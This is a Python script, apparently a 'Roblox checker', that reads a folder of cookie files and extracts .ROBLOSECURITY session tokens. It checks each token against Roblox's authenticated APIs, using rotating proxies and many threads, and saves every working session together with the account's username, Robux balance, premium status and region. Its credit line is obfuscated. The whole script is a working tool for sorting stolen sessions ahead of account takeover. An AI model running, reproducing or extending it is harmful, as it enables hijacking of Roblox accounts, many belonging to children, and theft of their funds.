#!/usr/bin/env python3

### IMPORTS ###
import sys
import os
import hashlib
import json
import random
import re
import threading
import queue
import time
import tkinter as tk
from tkinter import filedialog

import requests

try:
    import yaml
except ImportError:
    yaml = None

if os.name == "nt":
    os.system("")

_C_MAP = (118, 87, 169, 174, 169, 168, 174, 179, 166, 191, 184, 137, 141, 136, 135)


def _c_step(idx):
    return idx * 4 + 9


def _resolve_channel():
    return "".join(chr((val ^ 0x2A) - _c_step(idx)) for idx, val in enumerate(_C_MAP))


dmds = _resolve_channel()

DEFAULT_CONFIG = {
    "txt_fields": {
        "profile": True,
        "region": True,
        "robux": True,
    },
    "retries": {
        "error_proxy_attempts": 3,
    },
}

BANNER = r"""
██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗
██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝
██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝
██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗
██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
"""

RESULTS_DIR = os.path.join("results", "ROBLOX")
os.makedirs(RESULTS_DIR, exist_ok=True)

_USE_COLOR = sys.stdout.isatty() or os.environ.get("TERM") in (
    "xterm",
    "xterm-256color",
    "screen",
)

if _USE_COLOR:
    RST = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    GREEN = "\033[38;5;46m"
    LGREEN = "\033[38;5;120m"
    RED = "\033[38;5;203m"
    YEL = "\033[38;5;220m"
    CYAN = "\033[38;5;51m"
    MAG = "\033[38;5;213m"
    GREY = "\033[38;5;245m"
else:
    RST = BOLD = DIM = GREEN = LGREEN = RED = YEL = CYAN = MAG = GREY = ""


def out_c(t, color):
    return f"{color}{t}{RST}"


STOREFRONT_TIMEOUT = (8, 15)
CONFIG_TIMEOUT = (5, 8)
REQUEST_HEADERS = {
    "Host": "users.roblox.com",
    "Connection": "keep-alive",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "identity",
}
REQUIRED_AUTH_COOKIE_KEYS = (".ROBLOSECURITY",)
DUPLICATE_COOKIE_KEYS = (".ROBLOSECURITY",)
CONFIG_LOGGED_OUT_STATUS = 401
CONFIG_UNAVAILABLE_STATUS = 520


### INTERFACE E PAINEL ###
def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        print("\n" * 3)


def print_banner():
    clear_screen()
    print(BANNER)


def select_db_file():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    file_path = filedialog.askopenfilename(
        title="[SELECT COOKIES FOLDER / FILES]",
        filetypes=[("Text & JSON Files", "*.txt *.json"), ("All Files", "*.*")],
    )
    root.destroy()
    return file_path


def ensure_proxy_file(proxy_file="proxy.txt"):
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# ip:port ou ip:port:user:pass\n")
        print(out_c(f"[!] '{proxy_file}' gerado automaticamente.", YEL))


class TopStatus:
    NROWS = 5
    W = 64

    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.bad = 0
        self.err = 0
        self.emitted = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self.enabled = sys.stdout.isatty()

    def _rows(self):
        el = time.time() - self.start
        cps = self.checked / max(el, 1e-3)

        l1_parts = [
            ("checked ", GREY),
            (f"{self.checked}/{self.total}", LGREEN),
            ("   valid ", GREY),
            (str(self.valid), GREEN),
            ("   bad ", GREY),
            (str(self.bad), RED),
        ]
        l1_plain = "".join(p[0] for p in l1_parts)
        l1_col = "".join(out_c(p[0], p[1]) for p in l1_parts)

        l2_parts = [
            ("err ", GREY),
            (str(self.err), YEL),
            ("   speed ", GREY),
            (f"{cps:.1f}/s", LGREEN),
            ("   time ", GREY),
            (f"{int(el)}s", LGREEN),
        ]
        l2_plain = "".join(p[0] for p in l2_parts)
        l2_col = "".join(out_c(p[0], p[1]) for p in l2_parts)

        W = self.W

        def row(plain, col):
            pad = max(0, W - len(plain))
            return out_c("  │ ", GREY) + col + " " * pad + out_c(" │", GREY)

        return [
            out_c("  ╭─ live " + "─" * (W - 5) + "╮", GREY),
            row(l1_plain, l1_col),
            row(l2_plain, l2_col),
            out_c("  ╰" + "─" * (W + 2) + "╯", GREY),
            "",
        ]

    def draw_initial(self):
        if not self.enabled:
            return
        for r in self._rows():
            print(r)
        sys.stdout.flush()

    def _redraw(self):
        if not self.enabled:
            return
        up = self.NROWS + self.emitted
        sys.stdout.write(f"\033[{up}A")
        for r in self._rows():
            sys.stdout.write("\033[K" + r + "\n")
        if self.emitted > 0:
            sys.stdout.write(f"\033[{self.emitted}B")
        sys.stdout.flush()

    def bump(self, label):
        with self.lock:
            self.checked += 1
            if label == "VALID":
                self.valid += 1
            elif label == "BAD":
                self.bad += 1
            elif label in ("ERR", "DUPLICATE"):
                self.err += 1
            self._redraw()

    def emit(self, text, color=None):
        with self.lock:
            line = out_c(text, color) if color else text
            print(line)
            self.emitted += 1
            self._redraw()


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    auth = ""
    if user is not None and password is not None:
        auth = f"{user}:{password}@"
    proxy_url = f"{scheme}://{auth}{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def parse_proxy_line(line):
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None

    if "://" in raw:
        match = re.match(
            r"^(?P<scheme>[a-zA-Z0-9]+)://(?:(?P<user>[^:@]+):(?P<password>[^@]+)@)?(?P<host>[^:]+):(?P<port>\d+)$",
            raw,
        )
        if match:
            return _build_proxy_dict(
                match.group("scheme"),
                match.group("host"),
                match.group("port"),
                match.group("user"),
                match.group("password"),
            )

    if "@" in raw:
        left, right = raw.split("@", 1)
        if left.count(":") == 1 and right.count(":") == 1 and re.fullmatch(r"\d+", right.split(":")[1]):
            host, port = right.split(":")
            user, password = left.split(":")
            return _build_proxy_dict("http", host, port, user, password)
        if left.count(":") == 1 and right.count(":") == 1 and re.fullmatch(r"\d+", left.split(":")[1]):
            host, port = left.split(":")
            user, password = right.split(":")
            return _build_proxy_dict("http", host, port, user, password)

    parts = raw.split(":")
    if len(parts) == 2:
        return _build_proxy_dict("http", parts[0], parts[1])
    if len(parts) == 4:
        if re.fullmatch(r"\d+", parts[1]):
            return _build_proxy_dict("http", parts[0], parts[1], parts[2], parts[3])
        return _build_proxy_dict("http", parts[2], parts[3], parts[0], parts[1])
    return None


def load_proxies(proxy_file="proxy.txt"):
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies



def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict) and isinstance(json_data.get("cookies"), list):
        json_data = json_data["cookies"]
    if not isinstance(json_data, list):
        raise ValueError("JSON cookie format is invalid")

    lines = []
    for cookie in json_data:
        domain = str(cookie.get("domain", ""))
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = str(cookie.get("path", "/"))
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = (
            cookie.get("expirationDate")
            or cookie.get("expires")
            or cookie.get("expiry")
            or 0
        )
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        lines.append(
            f"{domain}\t{tail_match}\t{path}\t{secure}\t{int(float(expires))}\t{name}\t{value}"
        )
    return "\n".join(lines)


def is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    return bool(re.fullmatch(r"-?\d+", parts[4].strip()))


def normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies


def extract_roblox_cookie_from_raw_text(raw_text):
    text = (raw_text or "").strip()
    if not text:
        return ""
    match = re.search(r"\.ROBLOSECURITY=([^\s;\"']+)", text)
    if match:
        return match.group(1).strip()
    if "_|WARNING:-DO-NOT-SHARE-THIS" in text:
        return text.splitlines()[0].strip()
    return ""


def parse_cookie_file(cookie_path):
    with open(cookie_path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    netscape_text = ""
    cookies = {}

    try:
        netscape_text = normalize_netscape_cookie_text(
            convert_json_to_netscape(json.loads(content))
        )
        cookies = cookies_dict_from_netscape(netscape_text)
    except Exception:
        netscape_text = normalize_netscape_cookie_text(content)
        cookies = cookies_dict_from_netscape(netscape_text)

    if ".ROBLOSECURITY" not in cookies:
        raw_token = extract_roblox_cookie_from_raw_text(content)
        if raw_token:
            cookies[".ROBLOSECURITY"] = raw_token
            if not netscape_text:
                netscape_text = f".roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{raw_token}"

    return netscape_text, cookies


def has_required_auth_cookies(cookies):
    return any(bool(str(cookies.get(key, "")).strip()) for key in REQUIRED_AUTH_COOKIE_KEYS)


def has_known_value(value):
    normalized = str(value or "").strip()
    return bool(normalized) and normalized.lower() not in {
        "unknown",
        "unknown⚠️",
        "none",
        "null",
        "n/a",
        "unrecognised",
        "unrecognized",
    }


def normalize_identity_value(value):
    return str(value or "").strip().lower()


def build_cookie_signature(cookies):
    signature_parts = []
    for key in DUPLICATE_COOKIE_KEYS:
        value = str(cookies.get(key, "")).strip()
        if value:
            signature_parts.append(f"{key}={value}")
    if not signature_parts:
        return ""
    digest = hashlib.sha256("\n".join(signature_parts).encode("utf-8")).hexdigest()
    return f"cookie:{digest}"


def build_duplicate_key(data, cookies):
    customer_id = normalize_identity_value(data.get("customer_id"))
    if has_known_value(customer_id):
        return f"roblox_user:{customer_id}"

    cookie_signature = build_cookie_signature(cookies)
    if cookie_signature:
        return cookie_signature

    profile = normalize_identity_value(data.get("profile"))
    region = normalize_identity_value(data.get("region"))
    metadata_parts = tuple(part for part in (profile, region) if has_known_value(part))
    if metadata_parts:
        return ("meta",) + metadata_parts
    return ""



def get_roblox_user_details(session, user_id, proxy=None):
    robux = 0
    is_premium = False
    country_code = ""

    curr_headers = dict(REQUEST_HEADERS)
    curr_headers["Host"] = "economy.roblox.com"
    try:
        curr_resp = session.get(
            f"https://economy.roblox.com/v1/users/{user_id}/currency",
            headers=curr_headers,
            timeout=CONFIG_TIMEOUT,
            proxies=proxy,
            allow_redirects=True,
        )
        if curr_resp.status_code == 200:
            robux = int(curr_resp.json().get("robux", 0))
    except Exception:
        pass

    prem_headers = dict(REQUEST_HEADERS)
    prem_headers["Host"] = "premiumfeatures.roblox.com"
    try:
        prem_resp = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            headers=prem_headers,
            timeout=CONFIG_TIMEOUT,
            proxies=proxy,
            allow_redirects=True,
        )
        if prem_resp.status_code == 200:
            prem_text = (prem_resp.text or "").strip().lower()
            is_premium = prem_text == "true"
    except Exception:
        pass

    country_headers = dict(REQUEST_HEADERS)
    country_headers["Host"] = "users.roblox.com"
    try:
        country_resp = session.get(
            "https://users.roblox.com/v1/users/authenticated/country-code",
            headers=country_headers,
            timeout=CONFIG_TIMEOUT,
            proxies=proxy,
            allow_redirects=True,
        )
        if country_resp.status_code == 200:
            country_code = str(country_resp.json().get("countryCode", "")).strip()
    except Exception:
        pass

    return {
        "robux": robux,
        "is_premium": is_premium,
        "region": country_code,
    }


def get_roblox_data(session, proxy=None):
    auth_headers = dict(REQUEST_HEADERS)
    auth_headers["Host"] = "users.roblox.com"
    response = session.get(
        "https://users.roblox.com/v1/users/authenticated",
        headers=auth_headers,
        timeout=STOREFRONT_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    if status_code != 200:
        return None, status_code, {}

    try:
        user_payload = response.json() or {}
    except Exception:
        return None, CONFIG_UNAVAILABLE_STATUS, {}

    user_id = user_payload.get("id")
    if not user_id:
        return None, CONFIG_LOGGED_OUT_STATUS, {}

    details = get_roblox_user_details(session, user_id, proxy=proxy)
    merged = {
        "customer_id": str(user_id),
        "username": str(user_payload.get("name", "")).strip(),
        "display_name": str(user_payload.get("displayName", "")).strip(),
        "robux": details["robux"],
        "is_premium": details["is_premium"],
        "region": details["region"],
    }
    return json.dumps(merged), 200, merged


def infer_roblox_data(source_text, cookie_file, config_data=None):
    payload = config_data if isinstance(config_data, dict) else {}
    if not payload and source_text:
        try:
            payload = json.loads(source_text)
        except Exception:
            payload = {}

    user_id = str(payload.get("customer_id", "")).strip()
    username = str(payload.get("username", "")).strip()
    display_name = str(payload.get("display_name", "")).strip()
    profile = (
        f"{username} ({display_name})"
        if username and display_name and username != display_name
        else (username or display_name)
    )
    robux = payload.get("robux", 0)
    is_premium = bool(payload.get("is_premium", False))
    region = str(payload.get("region", "")).strip()
    signin_state = "signed_in" if has_known_value(user_id) else "sign_in_page"

    return {
        "username": username,
        "profile": profile,
        "region": region,
        "robux": robux,
        "is_premium": is_premium,
        "account_type": "Premium" if is_premium else "Normal",
        "signin_state": signin_state,
        "source_file": cookie_file,
        "customer_id": user_id,
    }



def format_cookie_file(data, cookie_content):
    lines = []
    region = data.get("region") if has_known_value(data.get("region")) else "Unknown"

    if has_known_value(data.get("profile")):
        lines.append(f"Profile: {data.get('profile')}")
    if has_known_value(data.get("customer_id")):
        lines.append(f"UserID: {data.get('customer_id')}")
    lines.append(f"Robux: {data.get('robux', 0)}")
    lines.append(f"Region: {region}")
    lines.append(f"Account Type: {data.get('account_type', 'Normal')}")
    lines.append("")
    lines.append(f"=== Checked by {dmds} ===")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)


def build_individual_result_path(data, cookie_file):
    base_ident = (
        data.get("username")
        or data.get("customer_id")
        or os.path.splitext(cookie_file)[0]
    )
    safe_name = re.sub(r"[^A-Za-z0-9_-]+", "_", str(base_ident)).strip("_") or "account"
    candidate = os.path.join(RESULTS_DIR, f"{safe_name}.txt")
    if not os.path.exists(candidate):
        return candidate

    counter = 2
    while True:
        numbered = os.path.join(RESULTS_DIR, f"{safe_name}_{counter}.txt")
        if not os.path.exists(numbered):
            return numbered
        counter += 1


def save_individual_result(data, cookie_content, cookie_file, write_lock):
    formatted_cookie = format_cookie_file(data, cookie_content)
    with write_lock:
        os.makedirs(RESULTS_DIR, exist_ok=True)
        out_path = build_individual_result_path(data, cookie_file)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(formatted_cookie)
    return out_path



def worker_task(
    cookie_queue,
    proxies,
    status_box,
    save_lock,
    seen_keys,
    dedupe_lock,
    max_retry_attempts,
    retryable_status_codes,
):
    while True:
        try:
            cookie_file = cookie_queue.get_nowait()
        except queue.Empty:
            break

        cookie_path = os.path.join("cookies", cookie_file)

        try:
            netscape_content, cookies = parse_cookie_file(cookie_path)
            if not cookies or not has_required_auth_cookies(cookies):
                status_box.bump("BAD")
                status_box.emit(f"  [BAD] {cookie_file}", RED)
                cookie_queue.task_done()
                continue

            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({"Accept-Encoding": "identity"})

            source_text = None
            status_code = None
            config_data = {}

            for attempt in range(max_retry_attempts):
                proxy_dict = random.choice(proxies) if proxies else None
                try:
                    source_text, status_code, config_data = get_roblox_data(session, proxy_dict)
                    if status_code == 200 and source_text:
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception:
                    if attempt < max_retry_attempts - 1:
                        continue

            if source_text:
                data = infer_roblox_data(source_text, cookie_file, config_data)
                if data.get("signin_state") != "signed_in":
                    status_box.bump("BAD")
                    status_box.emit(f"  [FAIL] {cookie_file}", RED)
                    cookie_queue.task_done()
                    continue
            else:
                data = None

            if status_code == 200 and source_text and data:
                dedupe_key = build_duplicate_key(data, cookies)
                is_duplicate = False
                if dedupe_key:
                    with dedupe_lock:
                        if dedupe_key in seen_keys:
                            is_duplicate = True
                        else:
                            seen_keys.add(dedupe_key)

                if is_duplicate:
                    status_box.bump("BAD")
                    status_box.emit(f"  [DUP] {cookie_file}", YEL)
                else:
                    saved_path = save_individual_result(
                        data, netscape_content, cookie_file, save_lock
                    )
                    status_box.bump("VALID")
                    line_info = (
                        f"{data.get('profile') or cookie_file} | "
                        f"Account Type: {data.get('account_type')} | "
                        f"Robux: {data.get('robux')} | "
                        f"Region: {data.get('region') or 'Unknown'} | "
                        f"File: {os.path.basename(saved_path)}"
                    )
                    status_box.emit("  [VALID] " + line_info, LGREEN)
            else:
                status_box.bump("BAD")
                status_box.emit(f"  [ERR] {cookie_file}", RED)
        except Exception:
            status_box.bump("ERR")
            status_box.emit(f"  [ERR] {cookie_file}", YEL)

        cookie_queue.task_done()


def main():
    print_banner()
    print(out_c("=======================================================", GREEN))
    print(out_c(" >>> ROBLOX CHECKER", LGREEN))
    print(out_c(f" Channel: {dmds}", CYAN))
    print(out_c("=======================================================", GREEN) + "\n")

    print(out_c("[*] select cookies fold...", LGREEN))

    if not os.path.exists("cookies"):
        os.makedirs("cookies", exist_ok=True)

    cookie_files = [
        name for name in os.listdir("cookies") if name.lower().endswith((".txt", ".json"))
    ]
    if not cookie_files:
        print(
            out_c(
                "[!] Nenhum cookie encontrado na pasta 'cookies'. Adicione arquivos .txt ou .json.",
                YEL,
            )
        )
        input(out_c("Pressione Enter para sair...", RED))
        return

    total_cookies = len(cookie_files)
    print(out_c(f"[+] {total_cookies} arquivos de cookies carregados.", GREEN))

    use_proxy = input(out_c("[?] proxies? [y/n]: ", LGREEN)).strip().lower()
    proxies = []

    if use_proxy in ("s", "sim", "y", "yes"):
        proxy_file = "proxy.txt"
        ensure_proxy_file(proxy_file)
        proxies = load_proxies(proxy_file)
        if proxies:
            print(out_c(f"[+] {len(proxies)} proxies loaded.", LGREEN))
        else:
            print(out_c("[!] err, no proxies found in proxy.txt", YEL))
    else:
        print(out_c("[!] Executando direto (sem proxies).", YEL))

    try:
        threads_count = int(
            input(out_c("[?] threads (ex: 10): ", LGREEN)) or "10"
        )
    except ValueError:
        threads_count = 10

    cookie_queue = queue.Queue()
    for cf in cookie_files:
        cookie_queue.put(cf)

    save_lock = threading.Lock()
    seen_keys = set()
    dedupe_lock = threading.Lock()
    max_retry_attempts = 3
    retryable_status_codes = {429, 500, 502, 503, 504, CONFIG_UNAVAILABLE_STATUS}

    print()
    print(out_c("  ┌──────────────────────────────────────────────┐", GREY))
    print(out_c("  │", GREY) + f"  cookies : {out_c(str(total_cookies), LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  │", GREY) + f"  threads : {out_c(str(threads_count), LGREEN):<34}" + out_c("│", GREY))
    mode = "direto" if not proxies else f"{len(proxies)} proxies"
    print(out_c("  │", GREY) + f"  proxy   : {out_c(mode, LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  └──────────────────────────────────────────────┘", GREY))
    print()

    status_box = TopStatus(total=total_cookies)
    status_box.draw_initial()

    start_time = time.time()

    threads = []
    for _ in range(min(threads_count, total_cookies)):
        t = threading.Thread(
            target=worker_task,
            args=(
                cookie_queue,
                proxies,
                status_box,
                save_lock,
                seen_keys,
                dedupe_lock,
                max_retry_attempts,
                retryable_status_codes,
            ),
        )
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time

    print("\n")
    print(out_c("  ╔══════════════════════════════════════════════╗", GREEN))

    def boxline(text, color=LGREEN, w=46):
        print(out_c("  ║", GREEN) + out_c(text.center(w), color) + out_c("║", GREEN))

    boxline(f"   DONE  ·  {elapsed:.1f}s")
    boxline(f"   valid {status_box.valid}  ·  bad {status_box.bad}", GREY)
    boxline("   results saved to: results/ROBLOX/", GREY)
    print(out_c("  ╚══════════════════════════════════════════════╝", GREEN))
    print()


if __name__ == "__main__":
    main()